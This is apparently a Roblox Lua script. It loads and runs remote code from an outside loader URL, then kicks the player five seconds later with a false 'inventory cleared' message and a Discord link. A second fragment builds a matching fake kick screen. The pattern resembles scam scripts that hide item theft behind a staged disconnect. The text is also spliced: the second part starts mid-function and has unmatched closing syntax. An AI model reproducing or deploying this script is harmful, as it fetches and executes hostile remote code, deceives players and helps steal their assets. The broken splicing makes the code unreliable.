-- Run your real loader script inside a protected call
local success, err = pcall(function()
    loadstring(game:HttpGet("https://lunor.dev/loader"))()
end)

-- If loader succeeded, start the kick timer
if success then
    local delayTime = 5  -- Seconds after loader finishes
    task.delay(delayTime, function()
        local player = game:GetService("Players").LocalPlayer
        player:Kick("Your Inventory Has just been cleared!\nhttps://discord.gg/example")
    end)
else
    warn("Loader script failed to run:", err)
end    title.TextSize = 28
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Parent = frame

    -- Divider Line
    local divider = Instance.new("Frame")
    divider.Size = UDim2.new(1, -20, 0, 1)
    divider.Position = UDim2.new(0, 10, 0, 45)
    divider.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
    divider.BorderSizePixel = 0
    divider.Parent = frame

    -- Message Label
    local message = Instance.new("TextLabel")
    message.Size = UDim2.new(1, -20, 1, -110)
    message.Position = UDim2.new(0, 10, 0, 55)
    message.BackgroundTransparency = 1
    message.TextWrapped = true
    message.Text = "You have been kicked from this experience.\nReason: Inventory cleared.\n\nFor support: discord.gg/example"
    message.Font = Enum.Font.SourceSans
    message.TextSize = 20
    message.TextColor3 = Color3.fromRGB(200, 200, 200)
    message.TextYAlignment = Enum.TextYAlignment.Top
    message.Parent = frame

    -- Leave Button
    local leaveBtn = Instance.new("TextButton")
    leaveBtn.Size = UDim2.new(0, 120, 0, 40)
    leaveBtn.Position = UDim2.new(0.5, 0, 1, -50)
    leaveBtn.AnchorPoint = Vector2.new(0.5, 0.5)
    leaveBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    leaveBtn.Text = "Leave"
    leaveBtn.Font = Enum.Font.SourceSansBold
    leaveBtn.TextSize = 20
    leaveBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
    leaveBtn.Parent = frame

    -- Rounded corners for button
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = leaveBtn

    leaveBtn.MouseButton1Click:Connect(function()
        player:Kick("You have left the experience.")
    end)
end)
